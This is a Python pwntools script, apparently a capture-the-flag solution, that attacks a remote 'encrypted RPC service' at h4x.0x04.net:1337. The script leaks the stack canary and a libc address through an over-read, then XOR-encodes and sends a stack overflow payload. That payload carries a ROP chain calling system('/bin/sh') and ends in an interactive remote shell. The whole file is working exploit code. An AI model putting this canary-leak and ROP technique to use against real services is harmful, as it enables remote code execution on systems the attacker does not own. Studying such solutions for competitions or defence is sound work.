#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from enum import Enum
from pwn import *

import numpy as np

class Type(Enum):
	READ_T = 0
	WRITE_T = 1
	APPEND_T = 2
	END_T = 3

MAX_DATA = 0x100
WELCOME = 'Welcome to encrypted RPC service!\n'
SEND = 'Send encrypted object:\n'
DATA = 'data: '
SERVER = 'h4x.0x04.net'
PORT = 1337
A = b'a'
EOS = b'\x00'

def make_obj(type, size = 0, data = A * MAX_DATA):
	return p32(type.value) + p32(size) + data

def make_read(size = MAX_DATA, data = A * (MAX_DATA - 1) + EOS):
	return make_obj(Type.READ_T, size, data)

def make_write():
	return make_obj(Type.WRITE_T)

def make_append(size = MAX_DATA, data = A * MAX_DATA):
	return make_obj(Type.APPEND_T, size, data)

def make_end():
	return make_obj(Type.END_T)

def tease(r, offset, skipn):
	data = make_read()
	data += make_append(offset)
	data += make_write()
	send(r, data)
	r.recvn(skipn + MAX_DATA - 1 + offset)

def memfrob(s):
	return (np.frombuffer(s, dtype=np.uint8) ^ 42).tobytes()

def connect_remote():
	return remote(SERVER, PORT)

def send(r, msg):
	r.send(memfrob(msg))

def get_canary(r):
	tease(r, 10, len(WELCOME + 3 * SEND + DATA))

	canary = b'\x00' + r.recvn(7)

	info("canary: 0x{:016x}".format(u64(canary)))
	r.clean()

	return canary

def get_libc(r):
	tease(r, 41, len(2 * SEND + DATA))

	libc = u64(r.recvn(6) + b'\x00\x00')

	libc -= 0x21ab0 # __libc_start_main@@GLIBC_2.2.5
	libc -= 0xf3
	libc += 0xC

	info("libc: 0x{:016x}".format(libc))
	r.clean()
	
	return libc

def get_rop(libc):
	POP_RDI = 0x2155f # pop rdi ; ret
	SYSTEM = 0x4f440 # system@@GLIBC_2.2.5
	BIN_SH = 0x1b3e9a # /bin/sh
	RET = POP_RDI + 1

	msg = p64(libc + RET)
	msg += p64(libc + POP_RDI)
	msg += p64(libc + BIN_SH)
	msg += p64(libc + SYSTEM)

	return msg

def exploit(r, canary, rop):
	data = A * 9
	data += canary
	data += A * 24
	data += rop

	msg = make_read()
	msg += make_append(len(data), data.ljust(MAX_DATA, A))
	msg += make_end()
	send(r, msg)
	r.recvn(len(2 * SEND))
	r.interactive()

def main():
	r = connect_remote()
	canary = get_canary(r)

	rop = get_rop(get_libc(r))
	exploit(r, canary, rop)

if __name__ == '__main__':
	main()
